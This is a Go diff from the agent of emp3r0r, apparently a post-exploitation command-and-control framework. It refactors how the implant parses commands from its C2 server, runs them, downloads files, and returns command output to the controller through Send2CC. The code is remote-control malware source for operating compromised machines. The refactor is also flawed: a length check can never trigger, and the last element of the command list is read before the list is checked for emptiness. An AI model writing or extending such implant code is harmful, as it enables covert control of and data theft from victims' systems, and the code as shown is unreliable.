@@ -27,20 +27,17 @@ func processCCData(data *emp3r0r_def.MsgTunData) {
 		err error
 	)
 
-	payloadSplit := strings.Split(data.Payload, emp3r0r_def.MagicString)
-	if len(payloadSplit) <= 1 {
-		log.Printf("Cannot parse CC command: %s, wrong OpSep (should be %s) maybe?",
-			data.Payload, emp3r0r_def.MagicString)
-		return
+	cmd_id := data.CmdID
+	cmd_argc := len(data.CmdSlice)
+	cmdSlice := data.CmdSlice
+	if cmd_argc < 0 {
+		log.Printf("Invalid command: %v", cmdSlice)
 	}
-	cmd_id := payloadSplit[len(payloadSplit)-1]
 
 	// command from CC
-	keep_running := strings.HasSuffix(payloadSplit[1], "&") // ./program & means keep running in background
-	cmd_str := strings.TrimSuffix(payloadSplit[1], "&")
-	cmdSlice := util.ParseCmd(cmd_str)
+	keep_running := strings.HasSuffix(cmdSlice[cmd_argc-1], "&") // ./program & means keep running in background
 	if len(cmdSlice) == 0 {
-		log.Printf("Cannot parse CC command: %s", strconv.Quote(cmd_str))
+		log.Printf("Cannot parse CC command: %v", cmdSlice)
 		return
 	}
 
@@ -310,7 +307,7 @@ func processCCData(data *emp3r0r_def.MsgTunData) {
 		}
 		_, err = SmartDownload(*download_addr, *file_to_download, *path, *orig_checksum)
 		if err != nil {
-			out = fmt.Sprintf("processCCData: cant download %s: %v", *file_to_download, err)
+			out = fmt.Sprintf("put: agent failed to download %s: %v", *file_to_download, err)
 			break
 		}
 		// checksum
@@ -378,12 +375,9 @@ func SendCmdRespToCC(resp, cmd_id string, cmdSlice []string) {
 	data2send := emp3r0r_def.MsgTunData{
 		Tag: RuntimeConfig.AgentTag,
 	}
-	data2send.Payload = fmt.Sprintf("cmd%s%s%s%s",
-		emp3r0r_def.MagicString,
-		strings.Join(cmdSlice, " "),
-		emp3r0r_def.MagicString,
-		resp)
-	data2send.Payload += emp3r0r_def.MagicString + cmd_id // cmd_id for cmd tracking
+	data2send.CmdID = cmd_id
+	data2send.CmdSlice = cmdSlice
+	data2send.Response = resp
 	if err := Send2CC(&data2send); err != nil {
 		log.Println(err)
 	}
